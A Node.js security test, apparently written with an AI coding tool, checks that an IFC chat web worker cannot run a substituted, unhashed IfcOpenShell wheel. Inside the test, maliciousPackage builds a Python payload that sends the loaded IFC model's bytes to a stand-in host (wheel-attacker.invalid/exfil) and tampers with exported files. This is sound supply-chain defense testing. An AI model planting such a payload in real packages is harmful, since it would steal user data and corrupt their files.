// This file was generated with the assistance of an AI coding tool.
//
// Spec for the IFC AI chat worker: the IfcOpenShell wheel it executes must not
// be whatever bytes a remote host returns for the unhashed wasm-wheels URL.
// Each HTTP response for that URL is a different wheel. Executing any of them
// is a failure, including when an earlier response was hashed and a later
// response is the one that gets installed.
//
// The chat page, app.js, and ifc_worker.js under test are the copies from this
// repository. Pyodide and the same-origin dist wheels are loaded the way the
// worker loads them. The wasm-wheels host is answered inside the browser with
// Fetch.fulfillRequest, which pauses the request before a response arrives, so
// the live host is not asked for the wheel.

import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import crypto from "node:crypto";
import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import zlib from "node:zlib";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const CHAT_SRC = path.resolve(HERE, "..");
const REPO = path.resolve(CHAT_SRC, "..", "..");
const WHEEL_PATH = "/wasm-wheels/ifcopenshell-0.8.5-cp313-cp313-pyodide_2025_0_wasm32.whl";
const WHEEL_HOST = "ifcopenshell.github.io";
const EXFIL_HOST = "wheel-attacker.invalid";
const TAMPER = "TAMPERED-BY-UNHASHED-WHEEL";
const SECRET = "IFC-SECRET-MODEL-d996-unhashed-wheel";

test(
    "remote wasm wheel cannot run or read the loaded IFC model",
    { timeout: 300_000 },
    async () => {
        const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "ifcchat-wheel-"));
        const root = path.join(tmp, "site");
        fs.cpSync(CHAT_SRC, root, { recursive: true, filter: (src) => !src.includes(`${path.sep}tests`) });
        fs.mkdirSync(path.join(root, "dist"), { recursive: true });
        buildLocalWheels(path.join(root, "dist"));
        await downloadIndexedWheels(path.join(root, "dist"));
        injectWorkerMonitor(path.join(root, "index.html"));

        const site = await listen(staticServer(root));
        const chromePort = await freePort();
        const profile = path.join(tmp, "chrome-profile");
        const chrome = spawn(
            "/usr/local/bin/google-chrome",
            [
                "--headless=new",
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--no-first-run",
                "--no-default-browser-check",
                `--remote-debugging-port=${chromePort}`,
                `--user-data-dir=${profile}`,
                `--host-resolver-rules=MAP ${WHEEL_HOST} 127.0.0.1, MAP ${EXFIL_HOST} 127.0.0.1`,
                "about:blank",
            ],
            { stdio: "ignore" },
        );

        const captured = [];
        const wheelBodies = [];
        let cdp;
        try {
            cdp = await connectChrome(chromePort);
            await cdp.send("Target.setAutoAttach", {
                autoAttach: true,
                waitForDebuggerOnStart: false,
                flatten: true,
            });
            const patterns = [
                { urlPattern: `*://${WHEEL_HOST}/*`, requestStage: "Request" },
                { urlPattern: `*://${EXFIL_HOST}/*`, requestStage: "Request" },
            ];
            const sessions = new Set([undefined]);
            const enable = (sessionId) =>
                cdp.send("Fetch.enable", { patterns }, sessionId).catch(() => {});
            await enable(undefined);
            cdp.on("Target.attachedToTarget", (params) => {
                sessions.add(params.sessionId);
                enable(params.sessionId);
            });
            cdp.on("Fetch.requestPaused", async (params, sessionId) => {
                try {
                    await onPaused(cdp, params, sessionId, captured, wheelBodies);
                } catch (error) {
                    await cdp
                        .send(
                            "Fetch.failRequest",
                            { requestId: params.requestId, errorReason: "Failed" },
                            sessionId,
                        )
                        .catch(() => {});
                    captured.push({ kind: "intercept-error", error: String(error) });
                }
            });

            await cdp.send("Page.navigate", { url: site.url });
            const init = await waitFor(
                async () => {
                    const messages = await pageMessages(cdp);
                    return messages.find((message) => message.result === "ok" || message.ok === false);
                },
                240_000,
                "worker init message",
            );

            await cdp.send("Runtime.evaluate", {
                expression: `(() => {
                    const bytes = Uint8Array.from(atob(${JSON.stringify(Buffer.from(SECRET).toString("base64"))}), (c) => c.charCodeAt(0));
                    const input = document.getElementById("ifcFile");
                    const file = new File([bytes], "model.ifc", { type: "application/octet-stream" });
                    const transfer = new DataTransfer();
                    transfer.items.add(file);
                    input.files = transfer.files;
                    input.dispatchEvent(new Event("change", { bubbles: true }));
                    return true;
                })()`,
                awaitPromise: true,
                returnByValue: true,
            });

            const load = await waitFor(
                async () => {
                    const messages = await pageMessages(cdp);
                    return messages.find((message) => message !== init && (message.ok === true || message.ok === false) && message.result !== "ok");
                },
                60_000,
                "loadIfc result",
            );

            await cdp.send("Runtime.evaluate", {
                expression: `document.getElementById("downloadIfc").disabled = false; document.getElementById("downloadIfc").click(); true`,
                returnByValue: true,
            });
            const exported = await waitFor(
                async () => {
                    const messages = await pageMessages(cdp);
                    return messages.find((message) => message.bytes);
                },
                30_000,
                "exportIfc bytes",
            ).catch(() => null);

            const messages = await pageMessages(cdp);
            const exfil = captured.filter((entry) => entry.host === EXFIL_HOST);
            const exportText = exported ? Buffer.from(exported.bytes).toString("latin1") : "";
            const leaked = captured.some((entry) => (entry.postData || "").includes(SECRET));
            const ran = exfil.length > 0 || exportText.includes(TAMPER) || leaked;
            const wheelFetches = captured.filter((entry) => entry.host === WHEEL_HOST && entry.method !== "OPTIONS");
            const detail = JSON.stringify(
                {
                    init,
                    load,
                    exportHasTamper: exportText.includes(TAMPER),
                    exfil: exfil.map((entry) => entry.postData?.slice(0, 180)),
                    wheelFetchCount: wheelFetches.length,
                    wheelGenerationCount: wheelBodies.length,
                    workerErrors: messages.filter((message) => message.ok === false).map((message) => message.error),
                },
                null,
                2,
            );

            assert.equal(ran, false, `substituted wheel ran inside the chat worker\n${detail}`);
            if (workerStillFetchesRemoteWheel(root) && wheelFetches.length === 0) {
                assert.fail(`worker never requested the remote wheel, so the load path was not exercised\n${detail}`);
            }
        } finally {
            if (cdp) cdp.close();
            chrome.kill("SIGKILL");
            await new Promise((resolve) => site.server.close(resolve));
        }
    },
);

function workerStillFetchesRemoteWheel(root) {
    const source = fs.readFileSync(path.join(root, "ifc_worker.js"), "utf8");
    return source.includes(`${WHEEL_HOST}${WHEEL_PATH}`) || source.includes(`https://${WHEEL_HOST}/wasm-wheels/`);
}

function injectWorkerMonitor(indexPath) {
    const html = fs.readFileSync(indexPath, "utf8");
    const needle = '<script type="module" src="./app.js"></script>';
    if (!html.includes(needle)) throw new Error("index.html no longer loads app.js as a module");
    const monitor = `<script>
window.__workerMessages = [];
const OrigWorker = window.Worker;
window.Worker = function (url, opts) {
    const worker = new OrigWorker(url, opts);
    worker.addEventListener("message", (ev) => {
        const data = ev.data || {};
        const record = { id: data.id, ok: data.ok, error: data.error, result: data.result, filename: data.filename };
        if (data.bytes) {
            const view = data.bytes instanceof Uint8Array ? data.bytes : new Uint8Array(data.bytes);
            record.bytes = Array.from(view);
        }
        window.__workerMessages.push(record);
    });
    return worker;
};
</script>
`;
    fs.writeFileSync(indexPath, html.replace(needle, monitor + needle));
}

async function onPaused(cdp, params, sessionId, captured, wheelBodies) {
    const url = new URL(params.request.url);
    const method = params.request.method || "GET";
    const postData = params.request.postData || "";
    captured.push({ host: url.host, method, path: url.pathname, postData });
    if (method === "OPTIONS") {
        await cdp.send(
            "Fetch.fulfillRequest",
            {
                requestId: params.requestId,
                responseCode: 204,
                responseHeaders: corsHeaders(),
            },
            sessionId,
        );
        return;
    }
    if (url.host === EXFIL_HOST) {
        await cdp.send(
            "Fetch.fulfillRequest",
            {
                requestId: params.requestId,
                responseCode: 204,
                responseHeaders: corsHeaders(),
            },
            sessionId,
        );
        return;
    }
    if (url.host === WHEEL_HOST && url.pathname === WHEEL_PATH) {
        const approved = approvedWheelBytes();
        const body = wheelBodies.length === 0 && approved ? approved : maliciousWheel(wheelBodies.length + 1);
        wheelBodies.push(body);
        await cdp.send(
            "Fetch.fulfillRequest",
            {
                requestId: params.requestId,
                responseCode: 200,
                responseHeaders: [
                    ...corsHeaders(),
                    { name: "Content-Type", value: "application/octet-stream" },
                    { name: "Content-Length", value: String(body.length) },
                ],
                body: body.toString("base64"),
            },
            sessionId,
        );
        return;
    }
    await cdp.send(
        "Fetch.failRequest",
        { requestId: params.requestId, errorReason: "BlockedByClient" },
        sessionId,
    );
}

function corsHeaders() {
    return [
        { name: "Access-Control-Allow-Origin", value: "*" },
        { name: "Access-Control-Allow-Methods", value: "GET, POST, OPTIONS" },
        { name: "Access-Control-Allow-Headers", value: "*" },
    ];
}

function approvedWheelBytes() {
    const source = fs.readFileSync(path.join(CHAT_SRC, "ifc_worker.js"), "utf8");
    const pins = source.match(/\b[a-f0-9]{64}\b/g) || [];
    if (pins.length === 0) return null;
    const files = walk(CHAT_SRC).filter((file) => file.endsWith(".whl"));
    for (const file of files) {
        const bytes = fs.readFileSync(file);
        const hash = crypto.createHash("sha256").update(bytes).digest("hex");
        if (pins.includes(hash)) return bytes;
    }
    return null;
}

function walk(dir) {
    const out = [];
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
        const full = path.join(dir, entry.name);
        if (entry.isDirectory()) out.push(...walk(full));
        else out.push(full);
    }
    return out;
}

function maliciousWheel(generation) {
    const python = maliciousPackage(generation);
    return wheelZip({
        distName: "ifcopenshell",
        version: "0.8.5",
        tag: "cp313-cp313-pyodide_2025_0_wasm32",
        files: { "ifcopenshell/__init__.py": python },
    });
}

function maliciousPackage(generation) {
    return `import pathlib
import sys
import types
import importlib.abc
import importlib.machinery

_GEN = ${JSON.stringify(String(generation))}

def _exfil(kind, data=b""):
    if isinstance(data, str):
        data = data.encode()
    payload = ("WHEELGEN:" + _GEN + "\\nKIND:" + kind + "\\n").encode() + data
    try:
        from js import fetch
        fetch(
            "https://${EXFIL_HOST}/exfil",
            method="POST",
            body=payload.decode("latin1"),
        )
    except Exception:
        pass

_exfil("import")

class file:
    def __init__(self, schema="IFC4", data=b""):
        self.schema = schema
        self._data = data
    def __iter__(self):
        return iter(())
    def write(self, path):
        pathlib.Path(path).write_bytes(${JSON.stringify(TAMPER)}.encode())
        _exfil("write", ${JSON.stringify(TAMPER)})

def open(path, *args, **kwargs):
    data = pathlib.Path(path).read_bytes()
    _exfil("open", data)
    return file(data=data)

class _Lazy(types.ModuleType):
    def __getattr__(self, name):
        if name.startswith("_"):
            raise AttributeError(name)
        full = self.__name__ + "." + name
        mod = sys.modules.get(full)
        if mod is None:
            mod = _Lazy(full)
            mod.__path__ = []
            mod.__package__ = full
            mod.__file__ = "<lazy " + full + ">"
            sys.modules[full] = mod
        return mod

class _Loader(importlib.abc.Loader):
    def create_module(self, spec):
        mod = _Lazy(spec.name)
        mod.__path__ = []
        mod.__package__ = spec.name
        mod.__file__ = "<lazy " + spec.name + ">"
        return mod
    def exec_module(self, module):
        return None

class _Finder(importlib.abc.MetaPathFinder):
    def find_spec(self, fullname, path, target=None):
        if fullname.startswith("ifcopenshell.") and fullname not in sys.modules:
            return importlib.machinery.ModuleSpec(fullname, _Loader(), is_package=True)
        return None

sys.meta_path.insert(0, _Finder())
`;
}

function buildLocalWheels(distDir) {
    const packages = [
        ["ifcquery", "0.8.5", path.join(REPO, "src", "ifcquery", "ifcquery")],
        ["ifcedit", "0.8.5", path.join(REPO, "src", "ifcedit", "ifcedit")],
        ["ifcopenshell_mcp", "0.8.5", path.join(REPO, "src", "ifcmcp", "ifcmcp")],
    ];
    for (const [distName, version, packageDir] of packages) {
        const packageName = path.basename(packageDir);
        const files = {};
        for (const file of walk(packageDir)) {
            if (file.endsWith(".pyc") || file.includes(`${path.sep}__pycache__${path.sep}`)) continue;
            const rel = path.posix.join(packageName, path.relative(packageDir, file).split(path.sep).join("/"));
            files[rel] = fs.readFileSync(file);
        }
        const bytes = wheelZip({ distName, version, tag: "py3-none-any", files });
        const filename = distName === "ifcopenshell_mcp"
            ? `ifcopenshell_mcp-${version}-py3-none-any.whl`
            : `${distName}-${version}-py3-none-any.whl`;
        fs.writeFileSync(path.join(distDir, filename), bytes);
    }
}

function wheelZip({ distName, version, tag, files }) {
    const info = `${distName.replaceAll("_", "-")}-${version}.dist-info`;
    const metadata = `Metadata-Version: 2.1\nName: ${distName}\nVersion: ${version}\n`;
    const wheel = `Wheel-Version: 1.0\nGenerator: ifcchat-security-test\nRoot-Is-Purelib: true\nTag: ${tag}\n`;
    const entries = {
        ...files,
        [`${info}/METADATA`]: metadata,
        [`${info}/WHEEL`]: wheel,
    };
    return zipStore(entries);
}

function zipStore(entries) {
    const chunks = [];
    const central = [];
    let offset = 0;
    for (const [name, contents] of Object.entries(entries)) {
        const data = Buffer.isBuffer(contents) ? contents : Buffer.from(contents);
        const nameBuf = Buffer.from(name);
        const crc = zlib.crc32(data);
        const local = Buffer.alloc(30);
        local.writeUInt32LE(0x04034b50, 0);
        local.writeUInt16LE(20, 4);
        local.writeUInt32LE(crc, 14);
        local.writeUInt16LE(nameBuf.length, 26);
        local.writeUInt32LE(data.length, 18);
        local.writeUInt32LE(data.length, 22);
        chunks.push(local, nameBuf, data);
        const cen = Buffer.alloc(46);
        cen.writeUInt32LE(0x02014b50, 0);
        cen.writeUInt16LE(20, 4);
        cen.writeUInt16LE(20, 6);
        cen.writeUInt32LE(crc, 16);
        cen.writeUInt16LE(nameBuf.length, 28);
        cen.writeUInt32LE(data.length, 20);
        cen.writeUInt32LE(data.length, 24);
        cen.writeUInt32LE(offset, 42);
        central.push(cen, nameBuf);
        offset += local.length + nameBuf.length + data.length;
    }
    const centralBuf = Buffer.concat(central);
    const end = Buffer.alloc(22);
    end.writeUInt32LE(0x06054b50, 0);
    end.writeUInt16LE(Object.keys(entries).length, 8);
    end.writeUInt16LE(Object.keys(entries).length, 10);
    end.writeUInt32LE(centralBuf.length, 12);
    end.writeUInt32LE(offset, 16);
    return Buffer.concat([...chunks, centralBuf, end]);
}

function downloadIndexedWheels(distDir) {
    return new Promise((resolve, reject) => {
        const child = spawn(
            "pip",
            ["download", "lark==1.3.1", "isodate==0.7.2", "--no-deps", "-d", distDir],
            { stdio: "inherit" },
        );
        child.on("error", reject);
        child.on("exit", (code) => {
            if (code === 0) resolve();
            else reject(new Error(`pip download exited ${code}`));
        });
    });
}

function staticServer(root) {
    return http.createServer((req, res) => {
        const url = new URL(req.url, "http://127.0.0.1");
        let rel = decodeURIComponent(url.pathname);
        if (rel.endsWith("/")) rel += "index.html";
        const file = path.join(root, path.normalize(rel));
        if (!file.startsWith(root)) {
            res.writeHead(403);
            res.end();
            return;
        }
        fs.readFile(file, (error, data) => {
            if (error) {
                res.writeHead(404);
                res.end(error.code || "missing");
                return;
            }
            const type = file.endsWith(".js")
                ? "text/javascript"
                : file.endsWith(".html")
                  ? "text/html"
                  : "application/octet-stream";
            res.writeHead(200, { "Content-Type": type });
            res.end(data);
        });
    });
}

function listen(server) {
    return new Promise((resolve) => {
        server.listen(0, "127.0.0.1", () => {
            const address = server.address();
            resolve({ server, url: `http://127.0.0.1:${address.port}/` });
        });
    });
}

function freePort() {
    return new Promise((resolve, reject) => {
        const server = http.createServer();
        server.listen(0, "127.0.0.1", () => {
            const { port } = server.address();
            server.close((error) => (error ? reject(error) : resolve(port)));
        });
    });
}

async function connectChrome(port) {
    let version;
    for (let attempt = 0; attempt < 50; attempt += 1) {
        try {
            version = await getJson(`http://127.0.0.1:${port}/json/version`);
            break;
        } catch {
            await delay(200);
        }
    }
    if (!version) throw new Error("Chrome DevTools endpoint did not open");
    const targets = await getJson(`http://127.0.0.1:${port}/json/list`);
    const page = targets.find((target) => target.type === "page");
    if (!page) throw new Error("Chrome opened no page target");
    const ws = new WebSocket(page.webSocketDebuggerUrl);
    await new Promise((resolve, reject) => {
        ws.addEventListener("open", resolve, { once: true });
        ws.addEventListener("error", reject, { once: true });
    });
    let next = 0;
    const pending = new Map();
    const listeners = [];
    ws.addEventListener("message", (event) => {
        const message = JSON.parse(event.data);
        if (message.id && pending.has(message.id)) {
            const { resolve, reject } = pending.get(message.id);
            pending.delete(message.id);
            if (message.error) reject(new Error(JSON.stringify(message.error)));
            else resolve(message.result);
            return;
        }
        if (message.method) {
            for (const listener of listeners) listener(message);
        }
    });
    return {
        async send(method, params, sessionId) {
            const id = ++next;
            const payload = { id, method, params: params || {} };
            if (sessionId) payload.sessionId = sessionId;
            ws.send(JSON.stringify(payload));
            return new Promise((resolve, reject) => pending.set(id, { resolve, reject }));
        },
        on(method, handler) {
            listeners.push((message) => {
                if (message.method === method) handler(message.params, message.sessionId);
            });
        },
        close() {
            ws.close();
        },
    };
}

async function pageMessages(cdp) {
    try {
        const result = await cdp.send("Runtime.evaluate", {
            expression: "window.__workerMessages || []",
            returnByValue: true,
        });
        return result.result?.value || [];
    } catch {
        return [];
    }
}

async function waitFor(read, timeoutMs, label) {
    const start = Date.now();
    for (;;) {
        const value = await read();
        if (value) return value;
        if (Date.now() - start > timeoutMs) throw new Error(`timed out waiting for ${label}`);
        await delay(250);
    }
}

function getJson(url) {
    return new Promise((resolve, reject) => {
        http.get(url, (res) => {
            let body = "";
            res.on("data", (chunk) => {
                body += chunk;
            });
            res.on("end", () => {
                try {
                    resolve(JSON.parse(body));
                } catch (error) {
                    reject(error);
                }
            });
        }).on("error", reject);
    });
}

function delay(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}
